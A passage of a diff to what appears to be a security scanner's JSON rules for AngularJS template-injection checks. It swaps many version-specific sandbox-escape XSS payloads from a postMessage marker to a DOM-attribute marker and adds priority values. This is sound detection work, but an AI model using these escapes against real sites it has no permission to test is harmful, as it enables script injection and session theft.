@@ -1862,7 +1862,7 @@
             "expression_1_2_27_to_1_3_20": "angularjs/(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.](?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|angular[/_-][^\\n\\r<>]{0,160}(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b",
             "expression_1_4_2_to_1_5_8": "angularjs/(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.](?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|angular[/_-][^\\n\\r<>]{0,160}(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b"
           },
-          "proofChannel": "postMessage string marker ptk-xss:<markerToken>"
+          "proofChannel": "DOM execution marker attribute data-ptk-xss=<markerToken>"
         },
         "extensions": {},
         "presentation": {
@@ -1900,7 +1900,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()}}",
+                "value": "{{constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,48,49,45,49,49,53))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -1957,14 +1957,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-101-115",
-              "payload": "{{constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()}}",
+              "payload": "{{constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,48,49,45,49,49,53))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:0|1)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+|1\\.(?:0|1)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:0|1)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+",
               "versionRange": "legacy-1-0-1-to-1-1-5",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor"
+              "payloadFamily": "constructor-constructor",
+              "selectorPriorityBoost": 1280
             }
           }
         },
@@ -2036,7 +2037,7 @@
                   "query",
                   "form"
                 ],
-                "value": "constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()",
+                "value": "constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,48,49,45,49,49,53))')()",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2093,14 +2094,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-101-115",
-              "payload": "constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()",
+              "payload": "constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,48,49,45,49,49,53))')()",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:0|1)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+|1\\.(?:0|1)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:0|1)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+",
               "versionRange": "legacy-1-0-1-to-1-1-5",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor"
+              "payloadFamily": "constructor-constructor",
+              "selectorPriorityBoost": 1280
             }
           }
         },
@@ -2134,7 +2136,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{$on.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,115,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()}}",
+                "value": "{{$on.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,115,45,49,48,49,45,49,49,53))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2191,14 +2193,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-rs-101-115",
-              "payload": "{{$on.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,115,45,49,48,49,45,49,49,53),String.fromCharCode(42))')()}}",
+              "payload": "{{$on.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,115,45,49,48,49,45,49,49,53))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:0|1)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+|1\\.(?:0|1)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:0|1)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:0|1)\\.\\d+",
               "versionRange": "legacy-1-0-1-to-1-1-5",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "on-constructor"
+              "payloadFamily": "on-constructor",
+              "selectorPriorityBoost": 1000
             }
           }
         },
@@ -2232,7 +2235,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,48,45,49,50,49),String.fromCharCode(42))')()}}",
+                "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,48,45,49,50,49))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2289,14 +2292,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-120-121",
-              "payload": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,48,45,49,50,49),String.fromCharCode(42))')()}}",
+              "payload": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,48,45,49,50,49))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:0|1)\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:0|1)\\b|1\\.2\\.(?:0|1)\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:0|1)\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:0|1)\\b",
               "versionRange": "reflected-1-2-0-to-1-2-1",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "sub-call-get-own-property-descriptor"
+              "payloadFamily": "sub-call-get-own-property-descriptor",
+              "selectorPriorityBoost": 1120
             }
           }
         },
@@ -2432,7 +2436,8 @@
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "sub-call-get-own-property-descriptor-dom-marker"
+              "payloadFamily": "sub-call-get-own-property-descriptor-dom-marker",
+              "selectorPriorityBoost": 1120
             }
           }
         },
@@ -2466,7 +2471,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{{}.\")));postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,50,45,49,50,53),String.fromCharCode(42))//\"}}",
+                "value": "{{{}.\")));document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,50,45,49,50,53))//\"}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2523,14 +2528,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-122-125",
-              "payload": "{{{}.\")));postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,50,45,49,50,53),String.fromCharCode(42))//\"}}",
+              "payload": "{{{}.\")));document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,50,45,49,50,53))//\"}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:[2-5])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:[2-5])\\b|1\\.2\\.(?:[2-5])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:[2-5])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:[2-5])\\b",
               "versionRange": "reflected-1-2-2-to-1-2-5",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "parser-breakout"
+              "payloadFamily": "parser-breakout",
+              "selectorPriorityBoost": 1080
             }
           }
         },
@@ -2564,7 +2570,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,54,45,49,50,49,56),String.fromCharCode(42))')()}}",
+                "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,54,45,49,50,49,56))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2621,14 +2627,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-126-1218",
-              "payload": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,54,45,49,50,49,56),String.fromCharCode(42))')()}}",
+              "payload": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,54,45,49,50,49,56))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:[6-9]|1[0-8])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:[6-9]|1[0-8])\\b|1\\.2\\.(?:[6-9]|1[0-8])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:[6-9]|1[0-8])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:[6-9]|1[0-8])\\b",
               "versionRange": "reflected-1-2-6-to-1-2-18",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "proto-sub-call-get-own-property-descriptor"
+              "payloadFamily": "proto-sub-call-get-own-property-descriptor",
+              "selectorPriorityBoost": 1120
             }
           }
         },
@@ -2700,7 +2707,7 @@
                   "query",
                   "form"
                 ],
-                "value": "(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,54,45,49,50,49,56),String.fromCharCode(42))')()",
+                "value": "(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,54,45,49,50,49,56))')()",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2757,14 +2764,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-126-1218",
-              "payload": "(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,54,45,49,50,49,56),String.fromCharCode(42))')()",
+              "payload": "(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,54,45,49,50,49,56))')()",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:[6-9]|1[0-8])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:[6-9]|1[0-8])\\b|1\\.2\\.(?:[6-9]|1[0-8])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:[6-9]|1[0-8])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:[6-9]|1[0-8])\\b",
               "versionRange": "reflected-1-2-6-to-1-2-18",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "proto-sub-call-get-own-property-descriptor"
+              "payloadFamily": "proto-sub-call-get-own-property-descriptor",
+              "selectorPriorityBoost": 1120
             }
           }
         },
@@ -2798,7 +2806,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))\",\"a\"].sort(toString.constructor)}}",
+                "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2855,14 +2863,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-1219-1223",
-              "payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))\",\"a\"].sort(toString.constructor)}}",
+              "payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "sort-function-constructor"
+              "payloadFamily": "sort-function-constructor",
+              "selectorPriorityBoost": 1350
             }
           }
         },
@@ -2934,7 +2943,7 @@
                   "query",
                   "form"
                 ],
-                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))\",\"a\"].sort(toString.constructor)",
+                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2991,14 +3000,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-1219-1223",
-              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))\",\"a\"].sort(toString.constructor)",
+              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "sort-function-constructor"
+              "payloadFamily": "sort-function-constructor",
+              "selectorPriorityBoost": 1350
             }
           }
         },
@@ -3070,7 +3080,7 @@
                   "query",
                   "form"
                 ],
-                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))','a'].sort(toString.constructor);",
+                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51))','a'].sort(toString.constructor);",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3128,14 +3138,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-sq-1219-1223",
-              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51),String.fromCharCode(42))','a'].sort(toString.constructor);",
+              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51))','a'].sort(toString.constructor);",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "sort-constructor-single-quote"
+              "payloadFamily": "sort-constructor-single-quote",
+              "selectorPriorityBoost": 1500
             }
           }
         },
@@ -3233,7 +3244,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "parser-breakout-window-name"
+              "payloadFamily": "parser-breakout-window-name",
+              "selectorPriorityBoost": 1080
             }
           }
         },
@@ -3369,7 +3381,8 @@
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "parser-breakout-window-name"
+              "payloadFamily": "parser-breakout-window-name",
+              "selectorPriorityBoost": 1080
             }
           }
         },
@@ -3441,7 +3454,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{}.\")));postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,50,55,45,49,51,50,48),String.fromCharCode(42))//\";",
+                "value": "{}.\")));document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,50,55,45,49,51,50,48))//\";",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3498,14 +3511,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-1227-1320",
-              "payload": "{}.\")));postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,50,55,45,49,51,50,48),String.fromCharCode(42))//\";",
+              "payload": "{}.\")));document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,50,55,45,49,51,50,48))//\";",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.](?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b|angular[/_-][^\\n\\r<>]{0,160}(?:1\\.2\\.(?:2[7-9])|1\\.3\\.(?:[0-9]|1[0-9]|20))\\b",
               "versionRange": "expression-1-2-27-to-1-3-20",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "parser-breakout"
+              "payloadFamily": "parser-breakout",
+              "selectorPriorityBoost": 1080
             }
           }
         },
@@ -3603,7 +3617,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "charat-orderby-dom-marker-fromcharcode"
+              "payloadFamily": "charat-orderby-dom-marker-fromcharcode",
+              "selectorPriorityBoost": 1160
             }
           }
         },
@@ -3637,7 +3652,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,101,118,97,108,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');}}",
+                "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,101,118,97,108,45,49,52,48,45,49,52,57))//');}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3695,14 +3710,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-eval-140-149",
-              "payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,101,118,97,108,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');}}",
+              "payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,101,118,97,108,45,49,52,48,45,49,52,57))//');}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "prototype-charat-eval"
+              "payloadFamily": "prototype-charat-eval",
+              "selectorPriorityBoost": 1450
             }
           }
         },
@@ -3802,7 +3818,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "entity-template-marker-default"
+              "payloadFamily": "entity-template-marker-default",
+              "selectorPriorityBoost": 1900
             }
           }
         },
@@ -3902,7 +3919,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "entity-template-marker-alt"
+              "payloadFamily": "entity-template-marker-alt",
+              "selectorPriorityBoost": 1900
             }
           }
         },
@@ -4038,7 +4056,8 @@
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "charat-orderby-dom-marker-fromcharcode"
+              "payloadFamily": "charat-orderby-dom-marker-fromcharcode",
+              "selectorPriorityBoost": 1160
             }
           }
         },
@@ -4110,7 +4129,7 @@
                   "query",
                   "form"
                 ],
-                "value": "'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,101,118,97,108,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');",
